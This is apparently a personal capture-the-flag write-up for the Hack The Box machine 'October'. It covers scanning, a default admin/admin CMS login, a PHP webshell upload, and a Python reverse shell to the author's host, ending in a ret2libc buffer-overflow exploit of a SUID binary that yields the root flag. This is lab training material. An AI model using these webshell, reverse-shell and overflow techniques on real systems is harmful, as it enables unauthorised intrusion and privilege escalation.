# HTB - October 10.10.10.16


- Apache/2.4.7 (Ubuntu)
- gobuster find /backend
- Log as admin/admin
- Upload webshell.php5
- find sbit /usr/local/bin/ovrflw
- Ret2LibC with ALSR


# Walkthrough
- https://medium.com/@ebuschini/hack-the-box-october-32e4ad30e406
- https://0xdf.gitlab.io/2019/03/26/htb-october.html#privesc-to-root

# nmap

```
# nmap -sC -sV -A 10.10.10.16
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-08 00:12 CEST
Nmap scan report for 10.10.10.16
Host is up (0.033s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Potentially risky methods: PUT PATCH DELETE
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: October CMS - Vanilla


```



# gobuster

```
# /opt/gobuster/gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.16  -l -x html,php,js,txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.16
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php,js,txt
[+] Timeout:        10s
===============================================================
2019/09/08 00:15:56 Starting gobuster
===============================================================
/index.php (Status: 200) [Size: 5162]
/blog (Status: 200) [Size: 4253]
/forum (Status: 200) [Size: 9590]
/themes (Status: 301) [Size: 310]
/modules (Status: 301) [Size: 311]
[ERROR] 2019/09/08 00:19:06 [!] Get http://10.10.10.16/gallery.txt: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
/account (Status: 200) [Size: 5091]
/tests (Status: 301) [Size: 309]
/storage (Status: 301) [Size: 311]
/plugins (Status: 301) [Size: 311]
/backend (Status: 302) [Size: 400]
```
=> http://10.10.10.16/backend/


# http://10.10.10.16/backend/


Admin/admin


# Webshell

Media/Upload

Upload webshell.php, fail
Upload webshell.php5 : ok

# Webshell

```
http://10.10.10.16/storage/app/media/shell.php5?cmd=pwd
/var/www/html/cms/storage/app/media

http://10.10.10.16/storage/app/media/shell.php5?cmd=whoami
www-data

http://10.10.10.16/storage/app/media/shell.php5?cmd=ls%20-lR%20/home
home:
total 4
drwxr-xr-x 4 harry harry 4096 Apr 21  2017 harry

/home/harry:
total 5008
-rw-rw-r-- 1 harry harry 5123369 Apr 20  2017 october-1.0.412.tar.gz
-r--r--r-- 1 harry harry      33 Apr 21  2017 user.txt

http://10.10.10.16/storage/app/media/shell.php5?cmd=cat%20/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:107::/var/run/dbus:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
harry:x:1000:1000:Harry Varthakouris,,,:/home/harry:/bin/bash

http://10.10.10.16/storage/app/media/shell.php5?cmd=which%20nc
/bin/nc

```

## nc

nc -e doesn't work..

Use a python nc
```
http://10.10.10.16/storage/app/media/shell.php5?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.32%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

# nc -lvp 4444
listening on [any] 4444 ...

10.10.10.16: inverse host lookup failed: Unknown host
connect to [10.10.14.32] from (UNKNOWN) [10.10.10.16] 49328
/bin/sh: 0: can't access tty; job control turned off
$ $ $ $ 
$ 
$ python -c 'import pty; pty.spawn("/bin/bash")' 
www-data@october:/var/www/html/cms/storage/app/media$ 


## System info

```
www-data@october:/var/www/html/cms/storage/app/media$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.5 LTS"
NAME="Ubuntu"
VERSION="14.04.5 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.5 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"

$ cat /proc/version
Linux version 4.4.0-78-generic (buildd@lcy01-35) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #99~14.04.2-Ubuntu SMP Thu Apr 27 18:51:25 UTC 2017
<tml/cms/storage/app/media$ ls /boot | grep "vmlinuz"                        
vmlinuz-4.4.0-31-generic
vmlinuz-4.4.0-78-generic

$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 14.04.5 LTS
Release:	14.04
Codename:	trusty

$ uname -a
Linux october 4.4.0-78-generic #99~14.04.2-Ubuntu SMP Thu Apr 27 18:51:25 UTC 2017 i686 athlon i686 GNU/Linux
www-data@october:/var/www/html/cms/storage/app/media$ 
```


## Find sticky
```
find / -perm -4000 2>/dev/null | xargs ls -al
<tml/cms/storage/app/media$ find / -perm -4000 2>/dev/null | xargs ls -al    


-rwsr-xr-x 1 root    root        30112 May 15  2015 /bin/fusermount
-rwsr-xr-x 1 root    root        88752 Nov 24  2016 /bin/mount
-rwsr-xr-x 1 root    root        38932 May  8  2014 /bin/ping
-rwsr-xr-x 1 root    root        43316 May  8  2014 /bin/ping6
-rwsr-xr-x 1 root    root        35300 May 17  2017 /bin/su
-rwsr-xr-x 1 root    root        67704 Nov 24  2016 /bin/umount
-rwsr-sr-x 1 daemon  daemon      46652 Oct 21  2013 /usr/bin/at
-rwsr-xr-x 1 root    root        44620 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root    root        35916 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root    root        66284 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root    root        72860 Oct 21  2013 /usr/bin/mtr
-rwsr-xr-x 1 root    root        30984 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root    root        45420 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root    root        18168 Nov 24  2015 /usr/bin/pkexec
-rwsr-xr-x 1 root    root       156708 Oct 14  2016 /usr/bin/sudo
-rwsr-xr-x 1 root    root        18136 May  8  2014 /usr/bin/traceroute6.iputils
-rwsr-xr-- 1 root    messagebus 333952 Dec  7  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root    root         5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root    root       492972 Aug 11  2016 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root    root         9808 Nov 24  2015 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root    root         7377 Apr 21  2017 /usr/local/bin/ovrflw
-rwsr-xr-- 1 root    dip        323000 Apr 21  2015 /usr/sbin/pppd
-rwsr-sr-x 1 libuuid libuuid     17996 Nov 24  2016 /usr/sbin/uuidd


```


## /usr/local/bin/ovrflw

ASLR: cat /proc/sys/kernel/va_randomize_space => 2 ALSR on
NX bit: readelf -W -l <bin> 2>/dev/null | grep ‘GNU_STACK’ | grep -q ‘RWE’ 
Stack not executable

=> Ret2LibC


```$ for i in `seq 100 120`; do echo $i; /usr/local/bin/ovrflw $(python -c "print 'A'*$i"); done;
<o echo $i; /usr/local/bin/ovrflw $(python -c "print 'A'*$i"); done;         
100
101
102
103
104
105
106
107
108
109
110
111
112
Segmentation fault (core dumped)
113
Segmentation fault (core dumped)
114
```
```
for i in `seq 110 120`; do echo $i; gdb -batch -ex='run' -args /usr/local/bin/ovrflw $(python -c "print 'A'*$i+'BBBB'"); done; 
$ for i in `seq 110 120`; do echo $i; gdb -batch -ex='run' -args /usr/local/bin/ovrflw $(python -c "print 'A'*$i+'BBBB'"); done
<'run' -args /usr/local/bin/ovrflw $(python -c "print 'A'*$i+'BBBB'"); done  
110

Program received signal SIGSEGV, Segmentation fault.
0xb7004242 in ?? ()
111

Program received signal SIGSEGV, Segmentation fault.
0x00424242 in ?? ()
112

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
113

Program received signal SIGSEGV, Segmentation fault.
0x42424241 in ?? ()
114

```
Offset = 112

objdump -d /usr/local/bin/ovrflw | grep esp | grep jmp

```
 strings -a -t x  /lib/i386-linux-gnu/libc.so.6  | grep bin
< strings -a -t x  /lib/i386-linux-gnu/libc.so.6  | grep bin                 
   dff5 bindtextdomain
   f121 bindresvport
   fa8c bind
  10492 _nl_domain_bindings
  125bf bind_textdomain_codeset
 162bac /bin/sh
 163b8d invalid fastbin entry (free)
 1645d3 /bin:/usr/bin
 164b10 /bin/csh
 165fc7 /etc/bindresvport.blacklist
 1683a0 malloc(): smallbin double linked list corrupted
 168500 (old_top == (((mbinptr) (((char *) &((av)->bins[((1) - 1) * 2])) - __builtin_offsetof (struct malloc_chunk, fd)))) && old_size == 0) || ((unsigned long) (old_size) >= (unsigned long)((((__builtin_offsetof (struct malloc_chunk, fd_nextsize))+((2 *(sizeof(size_t))) - 1)) & ~((2 *(sizeof(size_t))) - 1))) && ((old_top)->size & 0x1) && ((unsigned long) old_end & pagemask) == 0)
```
/bin/sh is at 0x8014.

```
 readelf -s  /lib/i386-linux-gnu/libc.so.6 | grep system
< readelf -s  /lib/i386-linux-gnu/libc.so.6 | grep system                    
   243: 0011b710    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
   620: 00040310    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
```
system is at 0x40310

```
ovrflw Ret to libc
I’ll find an address of libc:

www-data@october:/dev/shm$ ldd /usr/local/bin/ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75 f8 000)
$ ldd /usr/local/bin/ovrflw | grep libc
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75 63 000)
$ ldd /usr/local/bin/ovrflw | grep libc
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75 d5 000)

And I can get offsets for system, exit, and bin/sh:

www-data@october:/dev/shm$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
www-data@october:/dev/shm$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/" 
 162bac /bin/sh
 164b10 /bin/csh
For this libc base (which is right 1/512 times):

exit: 0xb75f8000+0x33260 = 0xB762B260
system: 0xb75f8000+0x40310 = 0xB7638310
/bin/sh: = 0xb75f8000+0x162bac = 0xB775ABAC
```

Our payload will look like this: “112 As then the address of system then 4 bytes of junk and finally the address of /bin/sh”
To calculate the address of system and /bin/sh I simply took the address of the libc from ldd directly and used it at the base. Then you just do the sum of base + system and base + /bin/sh like we saw above.


```
while true; do /usr/local/bin/ovrflw $(python -c 'print "A" * 112 + "\x10\xb3\x5b\xb7" + "A" * 4 + "\xac\xdb\x6d\xb7"');sleep 0.1;done
Les deux loop fonctionnent...
```
```
while true; do /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"'); done
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Trace/breakpoint trap (core dumped)

ls
dr.php5
shell.php5
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
cat /home/harry/user.txt
29161ca87aa3d34929dc46efc40c89c0
cat /root/root.txt
6bcb9cff749c9318d2a6e71bbcf30318

```